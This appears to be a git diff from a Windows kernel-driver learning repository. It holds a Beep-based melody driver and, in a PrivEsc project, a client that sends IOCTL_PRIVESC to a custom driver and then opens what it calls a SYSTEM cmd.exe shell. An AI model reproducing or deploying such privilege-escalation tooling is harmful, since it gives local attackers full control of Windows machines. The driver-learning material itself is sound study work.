++	g_State = ExAllocatePool2(POOL_FLAG_PAGED, sizeof(PlaybackState), DRIVER_TAG);
++
++	if (g_State == NULL) return STATUS_INSUFFICIENT_RESOURCES;
++
++	NTSTATUS status; 
++	status = PlaybackState_Init(g_State);
++
++	if (!NT_SUCCESS(status)) {
++		return status; 
++	}
++
++	status = STATUS_SUCCESS;
++	PDEVICE_OBJECT deviceObj = NULL;
++	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\KMelody");
++	do {
++		UNICODE_STRING name = RTL_CONSTANT_STRING(L"\\Device\\KMelody");
++		status = IoCreateDevice(DriverObject, 0, &name, FILE_DEVICE_UNKNOWN, 0, FALSE, &deviceObj);
++		if (!NT_SUCCESS(status))break;
++		status = IoCreateSymbolicLink(&symLink, &name);
++		if (!NT_SUCCESS(status))break;
++
++	} while (FALSE);
++
++	if (!NT_SUCCESS(status)) {
++		KdPrint((DRIVER_PREFIX "Error (0x%08X)\n", status));
++		PlaybackState_Cleanup(g_State);
++		if(deviceObj) IoDeleteDevice(deviceObj);
++		return status;
++	}
++
++	DriverObject->DriverUnload = MelodyUnload; 
++	DriverObject->MajorFunction[IRP_MJ_CREATE] = MelodyCreateClose; 
++	DriverObject->MajorFunction[IRP_MJ_CLOSE] = MelodyCreateClose; 
++	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = MelodyDeviceControl;
++
++	return STATUS_SUCCESS; 
++}
++
++void MelodyUnload(PDRIVER_OBJECT DriverObject) {
++	PlaybackState_Cleanup(g_State);
++	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\KMelody");
++	IoDeleteSymbolicLink(&symLink);
++	IoDeleteDevice(DriverObject->DeviceObject);
++}
++
++NTSTATUS MelodyDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
++	UNREFERENCED_PARAMETER(DeviceObject);
++	PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
++	NTSTATUS status = STATUS_INVALID_DEVICE_REQUEST;
++	ULONG info = 0; 
++	ULONG code = stack->Parameters.DeviceIoControl.IoControlCode;
++	ULONG inputLength = stack->Parameters.DeviceIoControl.InputBufferLength;
++	switch (code) {
++	
++		case IOCTL_MELODY_PLAY:
++			if (inputLength == 0 || inputLength % sizeof(Note) != 0) {
++				status = STATUS_INVALID_BUFFER_SIZE;
++				break;
++			}
++			PNote data = Irp->AssociatedIrp.SystemBuffer;
++			if (data == NULL) {
++				status = STATUS_INVALID_PARAMETER;
++				break; 
++			}
++			status = PlaybackState_AddNotes(g_State, data, inputLength / sizeof(Note));
++			if (!NT_SUCCESS(status))break; 
++			info = inputLength; 
++			break;
++	}
++
++	Irp->IoStatus.Status = status;
++	Irp->IoStatus.Information = info;
++	IoCompleteRequest(Irp, IO_NO_INCREMENT);
++	return status;
++}
++
++NTSTATUS MelodyCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
++	NTSTATUS status = STATUS_SUCCESS;
++	if (IoGetCurrentIrpStackLocation(Irp)->MajorFunction == IRP_MJ_CREATE) {
++		status = PlaybackState_Start(g_State, DeviceObject);
++	}
++	Irp->IoStatus.Status = status;
++	Irp->IoStatus.Information = 0;
++	IoCompleteRequest(Irp, IO_NO_INCREMENT);
++	return status;
++}
+\ No newline at end of file
+diff --git a/KMelody/KMelody/MelodyPublic.h b/KMelody/KMelody/MelodyPublic.h
+new file mode 100644
+index 0000000..12142d4
+--- /dev/null
++++ b/KMelody/KMelody/MelodyPublic.h
+@@ -0,0 +1,20 @@
++#pragma once
++
++#define MELODY_SYMLINK L"\\??\\KMelody"
++
++typedef struct Note {
++	ULONG Frequency;
++	ULONG Duration;
++	ULONG Delay;
++	ULONG Repeat;
++}Note, *PNote;
++
++typedef struct _FullNote {
++	Note base;            
++	LIST_ENTRY Link;      
++} FullNote, *PFullNote;
++
++#define DRIVER_PREFIX "MelodyDriver: "
++#define DRIVER_TAG 'gatM'  // 'Mtag' in ASCII (reversed due to little-endian storage)
++#define MELODY_DEVICE 0x8003
++#define IOCTL_MELODY_PLAY CTL_CODE(MELODY_DEVICE, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
+\ No newline at end of file
+diff --git a/KMelody/KMelody/PlaybackState.c b/KMelody/KMelody/PlaybackState.c
+new file mode 100644
+index 0000000..91412f5
+--- /dev/null
++++ b/KMelody/KMelody/PlaybackState.c
+@@ -0,0 +1,210 @@
++#include <ntddk.h>
++#include "..\KMelody\PlaybackState.h"
++#include "..\KMelody\MelodyPublic.h"
++#include <ntddbeep.h>
++
++// Initialize the PlaybackState structure, PlaybackState constructor
++NTSTATUS PlaybackState_Init(PPlaybackState state) {
++    if (!state) return STATUS_INVALID_PARAMETER;
++
++    // Initialize the list, synchronization objects, and semaphore
++    InitializeListHead(&state->m_head);
++    KeInitializeSemaphore(&state->m_counter, 0, 1000); // maximum of 1000 Notes to be queued
++    KeInitializeEvent(&state->m_stopEvent, SynchronizationEvent, FALSE);
++    ExInitializeFastMutex(&state->m_lock);
++    ExInitializePagedLookasideList(&state->m_lookaside, NULL, NULL, 0, sizeof(FullNote), DRIVER_TAG , 0);
++    state->m_hThread = NULL;
++
++    return STATUS_SUCCESS;
++}
++
++//PlaybackState destructor
++void PlaybackState_Cleanup(PPlaybackState state) {
++    
++    PlaybackState_Stop(state); // deletes the thread created 
++    ExDeletePagedLookasideList(&state->m_lookaside);
++
++}
++
++NTSTATUS PlaybackState_AddNotes(PPlaybackState state, const Note* notes, ULONG count) {
++    KdPrint((DRIVER_PREFIX "State::AddNotes %u\n", count));
++    for (ULONG i = 0; i < count; i++) {
++        PFullNote fullNote = (PFullNote)ExAllocateFromPagedLookasideList(&state->m_lookaside);
++        if (fullNote == NULL) {
++            return STATUS_INSUFFICIENT_RESOURCES;
++        }
++        memcpy(&fullNote->base, &notes[i], sizeof(Note));
++
++        // Lock before modifying the shared list
++        ExAcquireFastMutex(&state->m_lock);
++        InsertTailList(&state->m_head, &fullNote->Link);//CRITICAL SECTION 
++        ExReleaseFastMutex(&state->m_lock);
++    }
++
++    //
++    // make the semaphore signaled (if it wasn't already) to
++    // indicate there are new note(s) to play
++    //
++    KeReleaseSemaphore(&state->m_counter, 2, count, FALSE);
++
++    KdPrint((DRIVER_PREFIX "Semaphore count: %u\n", KeReadStateSemaphore(&state->m_counter)));
++    
++    return STATUS_SUCCESS;
++}
++
++NTSTATUS PlaybackState_Start(PPlaybackState state, PVOID IoObject) {
++        if (state == NULL || IoObject == NULL) {
++            return STATUS_INVALID_PARAMETER;
++        }
++
++        // Lock to ensure only one thread is created
++        ExAcquireFastMutex(&state->m_lock);
++
++        // Check if the thread is already running
++        if (state->m_hThread) {
++            ExReleaseFastMutex(&state->m_lock);
++            return STATUS_SUCCESS;
++        }
++
++        // Create a system thread
++        NTSTATUS status = IoCreateSystemThread(
++            IoObject,               // Driver or device object
++            &state->m_hThread,      // Resulting handle
++            THREAD_ALL_ACCESS,      // Access mask
++            NULL,                   // No object attributes required
++            NtCurrentProcess(),     // Create in the current process
++            NULL,                   // Returned client ID
++            PlaybackState_PlayMelody, // Thread function
++            state                   // Passed to thread function
++        );
++
++        // Unlock after thread creation attempt
++        ExReleaseFastMutex(&state->m_lock);
++
++        return status;
++}
++
++void PlaybackState_PlayMelody(PVOID context) {
++    PDEVICE_OBJECT beepDevice;
++    UNICODE_STRING beepDeviceName = RTL_CONSTANT_STRING(DD_BEEP_DEVICE_NAME_U);
++    PFILE_OBJECT beepFileObject;
++    NTSTATUS status = IoGetDeviceObjectPointer(&beepDeviceName, GENERIC_WRITE, &beepFileObject, &beepDevice);
++    if (!NT_SUCCESS(status)) {
++        KdPrint((DRIVER_PREFIX "Failed to locate beep device (0x%X)\n", status));
++        return;
++    }
++    PPlaybackState ctx = (PPlaybackState)context;
++    PVOID objects[] = { &ctx->m_counter, &ctx->m_stopEvent };
++    IO_STATUS_BLOCK ioStatus;
++    BEEP_SET_PARAMETERS params;
++
++    for (;;) {
++        status = KeWaitForMultipleObjects(2, objects, WaitAny, Executive, KernelMode, FALSE, NULL, NULL);
++        if (status == STATUS_WAIT_1) {
++            KdPrint((DRIVER_PREFIX "Stop event signaled. Exiting thread...\n"));
++            break;
++        }
++
++        KdPrint((DRIVER_PREFIX "Semaphore count: %u\n", KeReadStateSemaphore(&ctx->m_counter)));
++
++        PLIST_ENTRY link;
++
++        // Acquire lock (equivalent to Locker locker(m_lock);)
++        ExAcquireFastMutex(&ctx->m_lock);
++
++        link = RemoveHeadList(&ctx->m_head);
++
++        // Ensure we didn't remove the list head itself (list is not empty)
++        NT_ASSERT(link != &ctx->m_head);
++
++        // Release lock after modifying the list
++        ExReleaseFastMutex(&ctx->m_lock);
++
++        // Convert the list entry to a FullNote structure
++        PFullNote note = CONTAINING_RECORD(link, FullNote, Link);
++
++        if (note->base.Frequency == 0) {
++            //
++            // just do a delay
++            //
++            NT_ASSERT(note->base.Duration > 0);
++            LARGE_INTEGER interval;
++            interval.QuadPart = -10000LL * note->base.Duration;
++            KeDelayExecutionThread(KernelMode, FALSE, &interval);
++        }
++        else {
++            //If the frequency in the note is not zero, then we need to call the Beep driver with proper IRP.
++            params.Duration = note->base.Duration;
++            params.Frequency = note->base.Frequency;
++            int count = note->base.Repeat ? note->base.Repeat : 1;
++
++            KEVENT doneEvent;
++            KeInitializeEvent(&doneEvent, NotificationEvent, FALSE);
++            for (int i = 0; i < count; i++) {
++
++                PIRP irp = IoBuildDeviceIoControlRequest(IOCTL_BEEP_SET, beepDevice,
++                    &params, sizeof(params), NULL, 0, FALSE, &doneEvent, &ioStatus);
++
++                if (!irp) {
++                    KdPrint((DRIVER_PREFIX "Failed to allocate IRP\n"));
++                    break;
++                }
++                status = IoCallDriver(beepDevice, irp);
++                if (!NT_SUCCESS(status)) {
++                    KdPrint((DRIVER_PREFIX "Beep device playback error (0x%X)\n",
++                        status));
++                    break;
++                }
++                if (status == STATUS_PENDING) {
++                    KeWaitForSingleObject(&doneEvent, Executive, KernelMode,
++                        FALSE, NULL);
++                }
++                LARGE_INTEGER delay;
++                delay.QuadPart = -10000LL * note->base.Duration;
++                KeDelayExecutionThread(KernelMode, FALSE, &delay);
++
++                if (i < count - 1 && note->base.Delay != 0) {
++                    delay.QuadPart = -10000LL * note->base.Delay;
++                    KeDelayExecutionThread(KernelMode, FALSE, &delay);
++                }
++            }
++        }
++        ExFreeToPagedLookasideList(&ctx->m_lookaside, note);
++    }
++    //When the stop event is signaled
++    ObDereferenceObject(beepFileObject);
++}
++void PlaybackState_Stop(PPlaybackState state) {
++    if (state->m_hThread) {
++        //
++        // Signal the thread to stop
++        //
++        KeSetEvent(&state->m_stopEvent, 2, FALSE);
++
++        //
++        // Wait for the thread to exit
++        //
++        PVOID thread;
++        NTSTATUS status = ObReferenceObjectByHandle(
++            state->m_hThread,  // Handle to the thread
++            SYNCHRONIZE,       // Synchronization access
++            *PsThreadType,     // Object type
++            KernelMode,        // Running in kernel mode
++            &thread,           // Receives thread pointer
++            NULL               // Optional OBJECT_HANDLE_INFORMATION
++        );
++
++        if (!NT_SUCCESS(status)) {
++            KdPrint((DRIVER_PREFIX "ObReferenceObjectByHandle error (0x%X)\n", status));
++        }
++        else {
++            // Wait for the thread to terminate
++            KeWaitForSingleObject(thread, Executive, KernelMode, FALSE, NULL);
++            ObDereferenceObject(thread);  // Dereference the thread object
++        }
++
++        // Close the thread handle
++        ZwClose(state->m_hThread);
++        state->m_hThread = NULL;
++    }
++}
+\ No newline at end of file
+diff --git a/KMelody/KMelody/PlaybackState.h b/KMelody/KMelody/PlaybackState.h
+new file mode 100644
+index 0000000..2c6de7b
+--- /dev/null
++++ b/KMelody/KMelody/PlaybackState.h
+@@ -0,0 +1,19 @@
++#pragma once
++#include "MelodyPublic.h"
++
++typedef struct _PlaybackState {
++	LIST_ENTRY m_head; // head of a linked list holding the notes to play, must be protected with a synchronization object 
++	FAST_MUTEX m_lock;
++	PAGED_LOOKASIDE_LIST m_lookaside; // the Note objects will be allocated from a lookaside list (each note has a fixed size) 
++	KSEMAPHORE m_counter;
++	KEVENT m_stopEvent;
++	HANDLE m_hThread;
++}PlaybackState, *PPlaybackState;
++
++// Function prototypes
++NTSTATUS PlaybackState_Init(PPlaybackState state);
++void PlaybackState_Cleanup(PPlaybackState state);
++NTSTATUS PlaybackState_AddNotes(PPlaybackState state, const Note* notes, ULONG count);
++NTSTATUS PlaybackState_Start(PPlaybackState state, PVOID IoObject);
++void PlaybackState_Stop(PPlaybackState state);
++void PlaybackState_PlayMelody(PVOID context);
+diff --git a/PrivEsc/ClientPrivEsc/ClientPrivEsc.cpp b/PrivEsc/ClientPrivEsc/ClientPrivEsc.cpp
+new file mode 100644
+index 0000000..0bb2522
+--- /dev/null
++++ b/PrivEsc/ClientPrivEsc/ClientPrivEsc.cpp
+@@ -0,0 +1,68 @@
++#include <stdio.h>
++#include <Windows.h>
++#include "..\PrivEsc\PrivEscCommon.h"
++
++int main() {
++    HANDLE hDevice;
++    BOOL result;
++    DWORD bytesReturned;
++    char InputBuffer[128] = { 0 };
++    char OutputBuffer[128] = { 0 };
++
++    hDevice = CreateFileW(L"\\\\.\\PrivEsc", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
++
++    if (hDevice == INVALID_HANDLE_VALUE) {  // Corrected the condition
++        DWORD error = GetLastError();
++        printf("Error opening device (%u)\n", error);
++
++        switch (error) {
++        case ERROR_ACCESS_DENIED:
++            printf("Access denied. Try running as Administrator.\n");
++            break;
++        case ERROR_FILE_NOT_FOUND:
++            printf("Device not found. Ensure the driver is running.\n");
++            break;
++        default:
++            printf("Unknown error occurred while opening the device.\n");
++            break;
++        }
++        return 1;
++    }
++
++    printf("Device opened successfully!\n");
++
++    result = DeviceIoControl(hDevice, IOCTL_PRIVESC, InputBuffer, sizeof(InputBuffer),
++        OutputBuffer, sizeof(OutputBuffer), &bytesReturned, NULL);
++
++    if (!result) {
++        DWORD error = GetLastError();
++        printf("Error sending IOCTL: %lu\n", error);
++
++        switch (error) {
++        case ERROR_ACCESS_DENIED:
++            printf("Permission denied. Run with Administrator privileges.\n");
++            break;
++        case ERROR_INVALID_PARAMETER:
++            printf("Incorrect parameters sent to the IOCTL.\n");
++            break;
++        case ERROR_FILE_NOT_FOUND:
++            printf("Device not found.\n");
++            break;
++        default:
++            printf("An unknown error occurred.\n");
++            break;
++        }
++
++        CloseHandle(hDevice);
++        return 1;
++    }
++
++    printf("Successfully sent IOCTL. Privilege escalation to NT SYSTEM should be complete.\n");
++
++    printf("Opening SYSTEM shell...\n");
++    system("cmd.exe");  // Blocking call to open cmd.exe with elevated privileges
++
++    CloseHandle(hDevice);
++
++    return 0;
++}
+diff --git a/PrivEsc/ClientPrivEsc/ClientPrivEsc.vcxproj b/PrivEsc/ClientPrivEsc/ClientPrivEsc.vcxproj
+new file mode 100644
+index 0000000..f87c4ce
+--- /dev/null
++++ b/PrivEsc/ClientPrivEsc/ClientPrivEsc.vcxproj
+@@ -0,0 +1,136 @@
++<?xml version="1.0" encoding="utf-8"?>
++<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
++  <ItemGroup Label="ProjectConfigurations">
++    <ProjectConfiguration Include="Debug|Win32">
++      <Configuration>Debug</Configuration>
++      <Platform>Win32</Platform>
++    </ProjectConfiguration>
++    <ProjectConfiguration Include="Release|Win32">
++      <Configuration>Release</Configuration>
++      <Platform>Win32</Platform>
++    </ProjectConfiguration>
++    <ProjectConfiguration Include="Debug|x64">
++      <Configuration>Debug</Configuration>
++      <Platform>x64</Platform>
++    </ProjectConfiguration>
++    <ProjectConfiguration Include="Release|x64">
++      <Configuration>Release</Configuration>
++      <Platform>x64</Platform>
++    </ProjectConfiguration>
++  </ItemGroup>
++  <PropertyGroup Label="Globals">
++    <VCProjectVersion>17.0</VCProjectVersion>
++    <Keyword>Win32Proj</Keyword>
++    <ProjectGuid>{57645c20-0afb-4086-81a1-287eea0dbc25}</ProjectGuid>
++    <RootNamespace>ClientPrivEsc</RootNamespace>
++    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
++  </PropertyGroup>
++  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
++    <ConfigurationType>Application</ConfigurationType>
++    <UseDebugLibraries>true</UseDebugLibraries>
++    <PlatformToolset>v143</PlatformToolset>
++    <CharacterSet>Unicode</CharacterSet>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
++    <ConfigurationType>Application</ConfigurationType>
++    <UseDebugLibraries>false</UseDebugLibraries>
++    <PlatformToolset>v143</PlatformToolset>
++    <WholeProgramOptimization>true</WholeProgramOptimization>
++    <CharacterSet>Unicode</CharacterSet>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
++    <ConfigurationType>Application</ConfigurationType>
++    <UseDebugLibraries>true</UseDebugLibraries>
++    <PlatformToolset>v143</PlatformToolset>
++    <CharacterSet>Unicode</CharacterSet>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
++    <ConfigurationType>Application</ConfigurationType>
++    <UseDebugLibraries>false</UseDebugLibraries>
++    <PlatformToolset>v143</PlatformToolset>
++    <WholeProgramOptimization>true</WholeProgramOptimization>
++    <CharacterSet>Unicode</CharacterSet>
++  </PropertyGroup>
++  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
++  <ImportGroup Label="ExtensionSettings">
++  </ImportGroup>
++  <ImportGroup Label="Shared">
++  </ImportGroup>
++  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
++    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
++  </ImportGroup>
++  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
++    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
++  </ImportGroup>
++  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
++    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
++  </ImportGroup>
++  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
++    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
++  </ImportGroup>
++  <PropertyGroup Label="UserMacros" />
++  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
++    <ClCompile>
++      <WarningLevel>Level3</WarningLevel>
++      <SDLCheck>true</SDLCheck>
++      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
++      <ConformanceMode>true</ConformanceMode>
++    </ClCompile>
++    <Link>
++      <SubSystem>Console</SubSystem>
++      <GenerateDebugInformation>true</GenerateDebugInformation>
++    </Link>
++  </ItemDefinitionGroup>
++  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
++    <ClCompile>
++      <WarningLevel>Level3</WarningLevel>
++      <FunctionLevelLinking>true</FunctionLevelLinking>
++      <IntrinsicFunctions>true</IntrinsicFunctions>
++      <SDLCheck>true</SDLCheck>
++      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
++      <ConformanceMode>true</ConformanceMode>
++    </ClCompile>
++    <Link>
++      <SubSystem>Console</SubSystem>
++      <EnableCOMDATFolding>true</EnableCOMDATFolding>
++      <OptimizeReferences>true</OptimizeReferences>
++      <GenerateDebugInformation>true</GenerateDebugInformation>
++    </Link>
++  </ItemDefinitionGroup>
++  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
++    <ClCompile>
++      <WarningLevel>Level3</WarningLevel>
++      <SDLCheck>true</SDLCheck>
++      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
++      <ConformanceMode>true</ConformanceMode>
++      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
++    </ClCompile>
++    <Link>
++      <SubSystem>Console</SubSystem>
++      <GenerateDebugInformation>true</GenerateDebugInformation>
++    </Link>
++  </ItemDefinitionGroup>
++  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
++    <ClCompile>
++      <WarningLevel>Level3</WarningLevel>
++      <FunctionLevelLinking>true</FunctionLevelLinking>
++      <IntrinsicFunctions>true</IntrinsicFunctions>
++      <SDLCheck>true</SDLCheck>
++      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
++      <ConformanceMode>true</ConformanceMode>
++    </ClCompile>
++    <Link>
++      <SubSystem>Console</SubSystem>
++      <EnableCOMDATFolding>true</EnableCOMDATFolding>
++      <OptimizeReferences>true</OptimizeReferences>
++      <GenerateDebugInformation>true</GenerateDebugInformation>
++    </Link>
++  </ItemDefinitionGroup>
++  <ItemGroup>
++    <ClCompile Include="ClientPrivEsc.cpp" />
++  </ItemGroup>
++  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
++  <ImportGroup Label="ExtensionTargets">
++  </ImportGroup>
++</Project>
+\ No newline at end of file
+diff --git a/PrivEsc/ClientPrivEsc/ClientPrivEsc.vcxproj.filters b/PrivEsc/ClientPrivEsc/ClientPrivEsc.vcxproj.filters
+new file mode 100644
+index 0000000..b7b910c
+--- /dev/null
++++ b/PrivEsc/ClientPrivEsc/ClientPrivEsc.vcxproj.filters
+@@ -0,0 +1,22 @@
++﻿<?xml version="1.0" encoding="utf-8"?>
++<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
++  <ItemGroup>
++    <Filter Include="Source Files">
++      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
++      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
++    </Filter>
++    <Filter Include="Header Files">
++      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
++      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
++    </Filter>
++    <Filter Include="Resource Files">
++      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
++      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
++    </Filter>
++  </ItemGroup>
++  <ItemGroup>
++    <ClCompile Include="ClientPrivEsc.cpp">
++      <Filter>Source Files</Filter>
++    </ClCompile>
++  </ItemGroup>
++</Project>
+\ No newline at end of file
+diff --git a/PrivEsc/PrivEsc.sln b/PrivEsc/PrivEsc.sln
+new file mode 100644
+index 0000000..dfd70e0
+--- /dev/null
++++ b/PrivEsc/PrivEsc.sln
+@@ -0,0 +1,42 @@
++﻿
++Microsoft Visual Studio Solution File, Format Version 12.00
++# Visual Studio Version 17
++VisualStudioVersion = 17.12.35707.178 d17.12
++MinimumVisualStudioVersion = 10.0.40219.1
++Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "PrivEsc", "PrivEsc\PrivEsc.vcxproj", "{3B4D7AFE-C31B-491A-8524-DD17A25655A5}"
++EndProject
++Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "ClientPrivEsc", "ClientPrivEsc\ClientPrivEsc.vcxproj", "{57645C20-0AFB-4086-81A1-287EEA0DBC25}"
++EndProject
++Global
++	GlobalSection(SolutionConfigurationPlatforms) = preSolution
++		Debug|ARM64 = Debug|ARM64
++		Debug|x64 = Debug|x64
++		Release|ARM64 = Release|ARM64
++		Release|x64 = Release|x64
++	EndGlobalSection
++	GlobalSection(ProjectConfigurationPlatforms) = postSolution
++		{3B4D7AFE-C31B-491A-8524-DD17A25655A5}.Debug|ARM64.ActiveCfg = Debug|ARM64
++		{3B4D7AFE-C31B-491A-8524-DD17A25655A5}.Debug|ARM64.Build.0 = Debug|ARM64
++		{3B4D7AFE-C31B-491A-8524-DD17A25655A5}.Debug|ARM64.Deploy.0 = Debug|ARM64
++		{3B4D7AFE-C31B-491A-8524-DD17A25655A5}.Debug|x64.ActiveCfg = Debug|x64
++		{3B4D7AFE-C31B-491A-8524-DD17A25655A5}.Debug|x64.Build.0 = Debug|x64
++		{3B4D7AFE-C31B-491A-8524-DD17A25655A5}.Debug|x64.Deploy.0 = Debug|x64
++		{3B4D7AFE-C31B-491A-8524-DD17A25655A5}.Release|ARM64.ActiveCfg = Release|ARM64
++		{3B4D7AFE-C31B-491A-8524-DD17A25655A5}.Release|ARM64.Build.0 = Release|ARM64
++		{3B4D7AFE-C31B-491A-8524-DD17A25655A5}.Release|ARM64.Deploy.0 = Release|ARM64
++		{3B4D7AFE-C31B-491A-8524-DD17A25655A5}.Release|x64.ActiveCfg = Release|x64
++		{3B4D7AFE-C31B-491A-8524-DD17A25655A5}.Release|x64.Build.0 = Release|x64
++		{3B4D7AFE-C31B-491A-8524-DD17A25655A5}.Release|x64.Deploy.0 = Release|x64
++		{57645C20-0AFB-4086-81A1-287EEA0DBC25}.Debug|ARM64.ActiveCfg = Debug|x64
++		{57645C20-0AFB-4086-81A1-287EEA0DBC25}.Debug|ARM64.Build.0 = Debug|x64
++		{57645C20-0AFB-4086-81A1-287EEA0DBC25}.Debug|x64.ActiveCfg = Debug|x64
++		{57645C20-0AFB-4086-81A1-287EEA0DBC25}.Debug|x64.Build.0 = Debug|x64
++		{57645C20-0AFB-4086-81A1-287EEA0DBC25}.Release|ARM64.ActiveCfg = Release|x64
++		{57645C20-0AFB-4086-81A1-287EEA0DBC25}.Release|ARM64.Build.0 = Release|x64
++		{57645C20-0AFB-4086-81A1-287EEA0DBC25}.Release|x64.ActiveCfg = Release|x64
++		{57645C20-0AFB-4086-81A1-287EEA0DBC25}.Release|x64.Build.0 = Release|x64
++	EndGlobalSection
++	GlobalSection(SolutionProperties) = preSolution
++		HideSolutionNode = FALSE
++	EndGlobalSection
++EndGlobal
+diff --git a/PrivEsc/PrivEsc/PrivEsc.vcxproj b/PrivEsc/PrivEsc/PrivEsc.vcxproj
+new file mode 100644
+index 0000000..4c88d51
+--- /dev/null
++++ b/PrivEsc/PrivEsc/PrivEsc.vcxproj
+@@ -0,0 +1,106 @@
++﻿<?xml version="1.0" encoding="utf-8"?>
++<Project DefaultTargets="Build" ToolsVersion="12.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
++  <ItemGroup Label="ProjectConfigurations">
++    <ProjectConfiguration Include="Debug|x64">
++      <Configuration>Debug</Configuration>
++      <Platform>x64</Platform>
++    </ProjectConfiguration>
++    <ProjectConfiguration Include="Release|x64">
++      <Configuration>Release</Configuration>
++      <Platform>x64</Platform>
++    </ProjectConfiguration>
++    <ProjectConfiguration Include="Debug|ARM64">
++      <Configuration>Debug</Configuration>
++      <Platform>ARM64</Platform>
++    </ProjectConfiguration>
++    <ProjectConfiguration Include="Release|ARM64">
++      <Configuration>Release</Configuration>
++      <Platform>ARM64</Platform>
++    </ProjectConfiguration>
++  </ItemGroup>
++  <PropertyGroup Label="Globals">
++    <ProjectGuid>{3B4D7AFE-C31B-491A-8524-DD17A25655A5}</ProjectGuid>
++    <TemplateGuid>{dd38f7fc-d7bd-488b-9242-7d8754cde80d}</TemplateGuid>
++    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
++    <MinimumVisualStudioVersion>12.0</MinimumVisualStudioVersion>
++    <Configuration>Debug</Configuration>
++    <Platform Condition="'$(Platform)' == ''">x64</Platform>
++    <RootNamespace>PrivEsc</RootNamespace>
++  </PropertyGroup>
++  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
++    <TargetVersion>Windows10</TargetVersion>
++    <UseDebugLibraries>true</UseDebugLibraries>
++    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
++    <ConfigurationType>Driver</ConfigurationType>
++    <DriverType>WDM</DriverType>
++    <Driver_SpectreMitigation>Spectre</Driver_SpectreMitigation>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
++    <TargetVersion>Windows10</TargetVersion>
++    <UseDebugLibraries>false</UseDebugLibraries>
++    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
++    <ConfigurationType>Driver</ConfigurationType>
++    <DriverType>WDM</DriverType>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM64'" Label="Configuration">
++    <TargetVersion>Windows10</TargetVersion>
++    <UseDebugLibraries>true</UseDebugLibraries>
++    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
